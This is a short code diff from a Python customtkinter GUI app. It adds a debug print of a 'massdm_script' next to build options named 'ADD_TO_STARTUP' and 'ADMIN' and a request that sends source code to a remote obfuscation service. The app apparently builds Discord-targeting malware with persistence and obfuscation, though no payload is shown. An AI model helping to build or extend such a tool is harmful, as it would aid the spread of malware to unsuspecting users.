@@ -301,6 +301,8 @@ class App(customtkinter.CTk):
             "ADD_TO_STARTUP": startup,
             "ADMIN": admin
         }
+
+        print(massdm_script)
         
         src = requests.get('https://septicx.repl.co/api/obfuscate', json={
             "options": {
